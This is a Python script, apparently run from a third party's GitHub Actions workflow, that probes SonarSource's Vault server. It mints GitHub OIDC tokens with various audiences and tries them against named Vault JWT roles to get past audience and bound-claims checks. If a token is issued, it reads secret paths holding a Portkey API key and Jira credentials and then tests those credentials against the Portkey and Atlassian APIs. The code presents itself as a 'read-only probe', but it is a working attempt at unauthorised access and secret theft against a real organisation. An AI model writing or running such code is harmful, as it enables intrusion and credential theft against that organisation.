#!/usr/bin/env python3
"""Read-only probe #4 (11978): locate jwt-ghwf roles' bound_audiences and reach bound_claims layer.

Established so far (runs 43183520806 / 43183931328, github-plugin-auth-jwt source read):
 - no role => "missing role" (no default_role)
 - 10 public SonarSource repo role names => role lookup OK, then validator error
   "invalid audience (aud) claim"; that error comes from jwt.Expected{Audiences: role.BoundAudiences}
   in path_login.go, so role.BoundAudiences is non-empty and != https://vault.sonar.build.
 - validation order is issuer -> subject -> audience -> (later, in path_login) bound_claims.
   We got audience error (not subject), so bound_subject is empty.
 - GitHub default aud (no audience param) = https://github.com/<repo owner>.
   GitHub REFUSES to mint aud=https://github.com/SonarSource for our repo
   ("Can't issue ID_TOKEN for audience 'https://github.com/SonarSource'").

Now: mint the audiences we are actually allowed to mint, and test them against the roles:
  - SonarSource            (bare org name; allowed)
  - https://github.com/cballk (our own owner URL; control that proves the anti-impersonation rule)
  - vault.sonar.build      (bare vault host)
plus one nonexistent-role control with a valid token, and if an audience is accepted we
stop at the bound_claims error (which may echo the expected claim values).
<=6 logins. Strictly read-only. If a token is issued -> capabilities-self/lookup-self +
<=1 exact KV read per path (masked) + <=1 minimal read-only validation.
"""
import base64
import json
import os
import time
import urllib.error
import urllib.parse
import urllib.request

VAULT = "https://vault.sonar.build"
RESULT = {"probe": "vault-bound-audiences-11978"}
ROLE_MAIN = "github-sonarsource-sonar-java"
ROLE_PROT = "github-sonarsource-sonar-java-protected"
CONTROL = "github-sonarsource-zz-nonexistent-11978-%d" % (int(time.time()) % 100000)
CANDIDATES = [
    ("bare_org", "SonarSource"),
    ("own_owner_url", "https://github.com/cballk"),
    ("bare_vault_host", "vault.sonar.build"),
]


def mask(v):
    v = str(v)
    return "****" if len(v) <= 8 else v[:4] + "****" + v[-4:] + f" (len={len(v)})"


def http(method, url, data=None, headers=None, timeout=25):
    h = {"User-Agent": "oidc-vault-probe/4.0"}
    if headers:
        h.update(headers)
    body = None
    if data is not None:
        body = json.dumps(data).encode()
        h.setdefault("Content-Type", "application/json")
    req = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return {"status": r.status, "body": r.read(300000)}
    except urllib.error.HTTPError as e:
        return {"status": e.code, "body": e.read(300000)}
    except Exception as e:
        return {"status": None, "error": f"{type(e).__name__}: {str(e)[:300]}"}


def jb(r):
    try:
        return json.loads(r["body"].decode("utf-8", "replace")) if r.get("body") else None
    except Exception:
        return {"_raw": (r.get("body") or b"")[:2000].decode("utf-8", "replace")}


def errs(j):
    if isinstance(j, dict):
        if isinstance(j.get("errors"), list):
            return "; ".join(str(x) for x in j["errors"])[:800]
        if "error" in j:
            return str(j["error"])[:800]
        return json.dumps(j)[:800]
    return str(j)[:800]


def decode_jwt(t):
    seg = t.split(".")[1]
    seg += "=" * (-len(seg) % 4)
    return json.loads(base64.urlsafe_b64decode(seg))


def get_oidc(aud):
    url = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL")
    tok = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
    u = url + ("&" if "?" in url else "?") + "audience=" + urllib.parse.quote(aud)
    r = http("GET", u, headers={"Authorization": "Bearer " + tok, "Accept": "application/json"})
    if r["status"] != 200:
        return None, jb(r)
    return json.loads(r["body"].decode())["value"], None


def login(role, jwt):
    r = http("POST", VAULT + "/v1/auth/jwt-ghwf/login", data={"role": role, "jwt": jwt})
    j = jb(r)
    out = {"role": role, "status": r["status"], "error": r.get("error")}
    tok = None
    if isinstance(j, dict) and isinstance(j.get("auth"), dict):
        tok = j["auth"].get("client_token")
        out["state"] = "TOKEN_ISSUED"
        out["policies"] = j["auth"].get("policies")
        out["ttl"] = j["auth"].get("lease_duration")
    else:
        e = errs(j)
        out["vault_error"] = e
        low = e.lower()
        if "could not be found" in low:
            out["state"] = "ROLE_NOT_FOUND"
        elif "audience" in low:
            out["state"] = "AUD_MISMATCH"
        elif "claim" in low or "subject" in low or "issuer" in low:
            out["state"] = "CLAIM_OR_ISSUER_MISMATCH"
        else:
            out["state"] = "OTHER_ERROR"
    return out, tok


def main():
    h = http("GET", VAULT + "/v1/sys/health")
    hj = jb(h)
    RESULT["sys_health"] = {"status": h["status"], "version": (hj or {}).get("version") if isinstance(hj, dict) else None}
    RESULT["egress"] = jb(http("GET", "https://api.ipify.org?format=json"))

    toks, mint = {}, {}
    for label, aud in CANDIDATES:
        j, e = get_oidc(aud)
        toks[label] = j
        mint[label] = {"aud_requested": aud, "ok": bool(j),
                       "error": (e or {}).get("errorMessage") if isinstance(e, dict) else e,
                       "aud_claim": (decode_jwt(j).get("aud") if j else None)}
    RESULT["audience_mint"] = mint

    matrix, token_used = [], None

    def run(label, role):
        nonlocal token_used
        t = toks.get(label)
        if not t:
            matrix.append({"aud": label, "role": role, "state": "NO_TOKEN"})
            return None
        o, tk = login(role, t)
        o["aud"] = label
        matrix.append(o)
        token_used = token_used or tk
        return o["state"]

    # A) does any mintable audience satisfy the existing role?
    s_bare = run("bare_org", ROLE_MAIN)
    s_own = run("own_owner_url", ROLE_MAIN)
    s_host = run("bare_vault_host", ROLE_MAIN)
    # B) control: nonexistent role with a valid token -> must be ROLE_NOT_FOUND
    run("bare_org", CONTROL)
    # C) protected variant, only if the bare-org audience actually got past the audience check
    if s_bare and s_bare != "AUD_MISMATCH":
        run("bare_org", ROLE_PROT)
    RESULT["matrix"] = matrix

    if token_used:
        H = {"X-Vault-Token": token_used}
        paths = ["development/kv/data/code-security-diff-val-claude-code", "development/kv/data/jira"]
        cap = http("POST", VAULT + "/v1/sys/capabilities-self", data={"paths": paths}, headers=H)
        RESULT["capabilities_self"] = {"status": cap["status"], "json": jb(cap)}
        lk = http("GET", VAULT + "/v1/auth/token/lookup-self", headers=H)
        lj = jb(lk)
        if isinstance(lj, dict) and isinstance(lj.get("data"), dict):
            lj = {"data": {k: lj["data"].get(k) for k in ("display_name", "policies", "ttl", "meta")}}
        RESULT["lookup_self"] = {"status": lk["status"], "json": lj}
        caps = ((RESULT.get("capabilities_self") or {}).get("json") or {}).get("data") or {}
        kv = {}
        for path in paths:
            allowed = None
            for k, v in (caps.items() if isinstance(caps, dict) else []):
                if path in k or k in path:
                    allowed = "read" in (v or [])
            if allowed is False:
                kv[path] = {"skipped": "no read permission per capabilities-self"}
                continue
            rr = http("GET", f"{VAULT}/v1/{path}", headers=H)
            j = jb(rr)
            item = {"status": rr["status"]}
            if isinstance(j, dict) and isinstance(j.get("data"), dict):
                dd = j["data"].get("data") if isinstance(j["data"].get("data"), dict) else j["data"]
                item["keys"] = sorted(dd.keys()) if isinstance(dd, dict) else None
                item["masked"] = {k: (mask(v) if isinstance(v, str) else "<non-str>") for k, v in dd.items()} if isinstance(dd, dict) else None
                if isinstance(dd, dict) and dd.get("portkey-api-key"):
                    RESULT["_pk"] = dd["portkey-api-key"]
                if isinstance(dd, dict) and dd.get("token"):
                    RESULT["_jira"] = (dd.get("user"), dd.get("token"))
            else:
                item["resp"] = j
            kv[path] = item
        RESULT["kv_read"] = kv
        if RESULT.get("_pk"):
            k = RESULT.pop("_pk")
            v = http("GET", "https://api.portkey.ai/v1/models", headers={"x-portkey-api-key": k})
            jj = jb(v)
            RESULT["portkey_validate"] = {"status": v["status"],
                                          "model_count": len(jj["data"]) if isinstance(jj, dict) and isinstance(jj.get("data"), list) else None}
        if RESULT.get("_jira"):
            u, t = RESULT.pop("_jira")
            b = base64.b64encode(f"{u}:{t}".encode()).decode()
            v = http("GET", "https://sonarsource.atlassian.net/rest/api/3/myself", headers={"Authorization": "Basic " + b})
            jj = jb(v)
            RESULT["jira_validate"] = {"status": v["status"],
                                       "identity": ({"accountId_present": bool(jj.get("accountId")),
                                                     "displayName": jj.get("displayName"),
                                                     "accountType": jj.get("accountType")} if isinstance(jj, dict) else None)}

    print("===RESULT_JSON_START===")
    print(json.dumps(RESULT, indent=1, default=str))
    print("===RESULT_JSON_END===")


if __name__ == "__main__":
    main()
